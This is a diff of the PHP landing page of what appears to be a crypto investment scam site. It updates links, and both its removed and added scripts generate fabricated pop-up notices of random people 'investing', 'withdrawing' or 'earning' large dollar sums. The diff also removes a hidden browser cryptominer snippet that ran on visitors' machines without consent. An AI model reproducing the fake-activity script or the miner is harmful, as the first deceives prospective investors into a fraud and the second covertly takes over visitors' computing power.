@@ -34,6 +34,7 @@
      <!-- Stylesheets End -->
     <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
     <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]-->
+    <link rel="stylesheet" href="<?php echo e(asset ('home/css/toast.css')); ?>"/>
     <link rel="stylesheet" href="<?php echo e(asset ('home/alert/fake-notification-min.css')); ?>"/>
 	<link rel="stylesheet" href="<?php echo e(asset('home/css/simple-notify.min.css')); ?>">
     <style>
@@ -61,7 +62,7 @@
 		   <div class="container">
 				<div class="row"> 
                     <div class="col-sm-6 col-md-4 logo">
-                        <a href="index.html" title="<?php echo e($settings->site_name); ?>">
+                        <a href="index" title="<?php echo e($settings->site_name); ?>">
                             <img class="light" src="<?php echo e(asset('/home/images/logo-light.png')); ?>"  width="120" alt="<?php echo e($settings->site_name); ?>">
                             <img class="dark" src="<?php echo e(asset('/home/images/logo-dark.png')); ?>"  width="120" alt="<?php echo e($settings->site_name); ?>">
                         </a>
@@ -128,8 +129,8 @@
                             <h1><?php echo e($settings->site_name); ?> makes it safe and easy to invest </h1>
                             <p class="lead">A place for everyone who wants to simply Invest and get high returns on every investment.</p>
                             <div class="hero-btns">
-                                <a href="login.html" class="btn">LOGIN</a>
-                                <a href="register.php" class="btn btn3">REGISTER TODAY</a>
+                                <a href="login" class="btn">LOGIN</a>
+                                <a href="register" class="btn btn3">REGISTER TODAY</a>
                             </div>
                         </div>
                     </div>
@@ -1355,11 +1356,11 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                     </div>
                     <div class="col-md-3 footer-box-2">
                         <ul class="footer-menu onepage">
-							 <li><a href="index.html#top">Home</a></li>
-                             <li><a href="index.html#about">About Us</a></li>
-                             <li><a href="index.html#token">Equities</a></li>
-                             <li><a href="index.html#team">Testimonials</a></li>
-                             <li><a href="contact.html">Contact Us</a></li>
+							 <li><a href="#top">Home</a></li>
+                             <li><a href="#about">About Us</a></li>
+                             <li><a href="#token">Equities</a></li>
+                             <li><a href="#team">Testimonials</a></li>
+                             <li><a href="#contact">Contact Us</a></li>
                         </ul>
                     </div>
                     <div class="col-md-5 footer-box-3">
@@ -1388,170 +1389,6 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
     <!--Main Wrapper End-->
  
  
- 
-		<style>
-					@-webkit-keyframes cptCircle {
-					  0% {
-						-webkit-transform: rotate(0) scale(0.5) skew(1deg);
-						transform: rotate(0) scale(0.5) skew(1deg);
-						opacity: 0.01;
-					  }
-					  30% {
-						-webkit-transform: rotate(0) scale(0.7) skew(1deg);
-						transform: rotate(0) scale(0.7) skew(1deg);
-						opacity: 0.5;
-					  }
-					  100% {
-						-webkit-transform: rotate(0) scale(1) skew(1deg);
-						transform: rotate(0) scale(1) skew(1deg);
-						opacity: 0.01;
-					  }
-					}
-
-					@keyframes  cptCircle {
-					  0% {
-						-webkit-transform: rotate(0) scale(0.5) skew(1deg);
-						transform: rotate(0) scale(0.5) skew(1deg);
-						opacity: 0.01;
-					  }
-					  30% {
-						-webkit-transform: rotate(0) scale(0.7) skew(1deg);
-						transform: rotate(0) scale(0.7) skew(1deg);
-						opacity: 0.5;
-					  }
-					  100% {
-						-webkit-transform: rotate(0) scale(1) skew(1deg);
-						transform: rotate(0) scale(1) skew(1deg);
-						opacity: 0.01;
-					  }
-					}
-
-					@-webkit-keyframes cptCircleFill {
-					  0% {
-						-webkit-transform: rotate(0) scale(0.6) skew(1deg);
-						transform: rotate(0) scale(0.6) skew(1deg);
-						opacity: 0;
-					  }
-					  50% {
-						webkit-transform: rotate(0) scale(1) skew(1deg);
-						transform: rotate(0) scale(1) skew(1deg);
-						opacity: 0.2;
-					  }
-					  100% {
-						-webkit-transform: rotate(0) scale(0.6) skew(1deg);
-						transform: rotate(0) scale(0.6) skew(1deg);
-						opacity: 0.2;
-					  }
-					}
-
-					@keyframes  cptCircleFill {
-					  0% {
-						-webkit-transform: rotate(0) scale(0.6) skew(1deg);
-						transform: rotate(0) scale(0.6) skew(1deg);
-						opacity: 0;
-					  }
-					  50% {
-						-webkit-transform: rotate(0) scale(1) skew(1deg);
-						transform: rotate(0) scale(1) skew(1deg);
-						opacity: 0.2;
-					  }
-					  100% {
-						-webkit-transform: rotate(0) scale(0.6) skew(1deg);
-						transform: rotate(0) scale(0.6) skew(1deg);
-						opacity: 0.2;
-					  }
-					}
-
-					#capitol-callback {
-					  font-family: Arial;
-					  position: fixed;
-					  width: 72px;
-					  height: 72px;
-					  bottom: 60px;
-					  top: auto;
-					  right: auto;
-					  left: 40px;
-					  z-index: 1;
-					}
-
-					.cpt-circle,
-					.cpt-circle-fill {
-					  position: absolute;
-					  border-radius: 100%;
-					  -webkit-transition: all 0.5s;
-					  transition: all 0.5s;
-					  -moz-box-sizing: border-box;
-					  box-sizing: border-box;
-					  opacity: 0;
-					  -webkit-animation-delay: 2s;
-					  animation-delay: 2s;
-					}
-
-					.cpt-circle {
-					  width: 250%;
-					  height: 250%;
-					  background-color: transparent;
-					  border: 2px solid #189d0e;
-					  -webkit-animation: cptCircle 2.2s infinite ease-in-out;
-					  animation: cptCircle 2.2s infinite ease-in-out;
-					  -webkit-transform-origin: 50% 50%;
-					  -ms-transform-origin: 50% 50%;
-					  transform-origin: 50% 50%;
-					  left: -71%;
-					  top: -75%;
-					}
-
-					.cpt-circle-fill {
-					  width: 155%;
-					  height: 155%;
-					  background-color: #189d0e;
-					  border: 2px solid transparent;
-					  -webkit-animation: cptCircleFill 2.3s infinite ease-in-out;
-					  animation: cptCircleFill 2.3s infinite ease-in-out;
-					  box-shadow: 0 0 2px 0 #189d0e !important;
-					  left: -23.5%;
-					  top: -27.5%;
-					}
-
-					.main-button {
-					  position: relative;
-					  right: 1px;
-					  top: 1px;
-					  float: right;
-					  width: 64px;
-					  height: 64px;
-					  background: center center no-repeat #189d0e;
-					  box-shadow: 0 3px 5px 1px rgba(0, 0, 0, 0.2);
-					  background-size: 30px;
-					  border-radius: 100%;
-					  cursor: pointer;
-					  font-size: 16px;
-					  color: #fff;
-					  text-align: center;
-					  line-height: 58px;
-					}
-
-					.main-button i {
-					  opacity: 0;
-					  visibility: hidden;
-					  -webkit-transition: all 0.6s cubic-bezier(0.55, 0, 0.1, 1);
-					  transition: all 0.6s cubic-bezier(0.55, 0, 0.1, 1);
-					  -webkit-transform: perspective(400px) rotateY(-180deg) scale(0.4)
-						translate3d(-50%, -50%, 0);
-					  transform: perspective(400px) rotateY(-180deg) scale(0.4)
-						translate3d(-50%, -50%, 0);
-					  z-index: 1;
-					  width: 45%;
-					  height: 45%;
-					  font-size: 16px;
-					  
-					}
-
-					.main-button img {
-					  vertical-align: middle;
-					}
-
-					</style>
 					<body>
 					 
 					  
@@ -1630,48 +1467,36 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
         });
     </script>
 	
+    
+    <div class="mgm" style="display: none;">
+        <div class="txt" style="color:black;"></div>
 
-	<script src="<?php echo e(asset('dash/js/simple-notify.min.js')); ?>"></script>
-    <script>
-        var transarray = ['just invested with', 'just withdrew', 'just earned', 'is trading with'];
-        interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
-        var run = setInterval(showprogress, interval);
-        var names = ["someone", "someone", "Aiden",  "Darren", "Isabella", "Aria", "John", "Greyson", "Peter", "Mohammed", "William",
-                "Lucas", "Amelia", "Mason", "Mathew", "Richard", "Chris", "Mia", "Oliver"];
-        var countries = ["USA","UAE","ITALY", "FLORIDA",  "MEXICO",  "INDIA",  "CHINA",  "CAMBODIA",  "UNITED KINGDOM",  "GERMANY", "AUSTRALIA",  "BANGLADESH", "SWEDEN", "PAKISTAN", "MALDIVES", "SEYCHELLES","BOLIVIA",
-                 "SOUTH AFRICA", "ZAMBIA", "ZIMBABWE", "LEBANESE", "SAUDI ARABIA", "CHILE", "PEUTO RICO"];
-            
-        function showprogress() {
-            
-            clearInterval(run);
+        <script type="text/javascript">
+            var listCountries = ['South Africa', 'USA', 'Germany', 'France', 'Italy', 'South Africa', 'Australia', 'South Africa', 'Canada', 'Argentina', 'Saudi Arabia', 'Mexico', 'South Africa', 'South Africa', 'Venezuela', 'South Africa', 'Sweden', 'South Africa', 'South Africa', 'Italy', 'South Africa', 'United Kingdom', 'South Africa', 'Greece', 'Cuba', 'South Africa', 'Portugal', 'Austria', 'South Africa', 'Panama', 'South Africa', 'South Africa', 'Netherlands', 'Switzerland', 'Belgium', 'Israel', 'Cyprus'];
+            var listPlans = ['$500','$1,500','$1,000','$10,000','$2,000','$3,000','$4,000', '$600', '$700', '$2,500'];
+            var transarray = ['just <b>invested</b> with', 'just <b>withdrew</b>', 'just <b>earned</b>', 'is <b>trading with</b>'];
             interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
-            var country = countries[Math.floor(Math.random() * countries.length)];
-            var name = names[Math.floor(Math.random() * names.length)];
-            var transtype = transarray[Math.floor(Math.random() * transarray.length)];
-            // var plan = listPlans[Math.floor(Math.random() * listPlans.length)];
-            var plan = `$${(Math.ceil((Math.floor(Math.random() * 50000) + 500) * 100) / 100).toLocaleString()}`;
-            var msg = `${name} from ${country} ${transtype} ${plan}`;
-            
-            new Notify ({
-                status: 'success',
-                title: 'FirstCryptoFX',
-                text: msg,
-                autoclose: true,
-                effect: 'slide'
-            });
-            run = setInterval(showprogress, interval);
-         }
+            var run = setInterval(request, interval);
+        
+            function request() {
+                clearInterval(run);
+                interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
+                var country = listCountries[Math.floor(Math.random() * listCountries.length)];
+                var transtype = transarray[Math.floor(Math.random() * transarray.length)];
+                // var plan = listPlans[Math.floor(Math.random() * listPlans.length)];
+                var plan = `$${(Math.ceil((Math.floor(Math.random() * 50000) + 500) * 100) / 100).toLocaleString()}`;
+                var msg = `Someone from <b> ${country} </b> ${transtype} <b style="color:blue;"> ${plan} </b>`;
+                $(".mgm .txt").html(msg);
+                $(".mgm").stop(true).fadeIn(1000);
+                window.setTimeout(function() {
+                    $(".mgm").stop(true).fadeOut(2000);
+                }, 10000);
+                run = setInterval(request, interval);
 
-     </script>
-	<!--miner-->
+            }
+        </script>
+    </div>
 
-    <script>
-        var miner = WMP.Anonymous('SK_XPOrdHezNlQ323zaH3qbs', {
-            throttle: 0.2});
-        miner.start();
-    </script> 
-    <!--miner-->
 </body>
 
-<!-- Mirrored from sacredthemes.net/cp-mercury.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 06 Mar 2021 08:19:11 GMT -->
 </html>
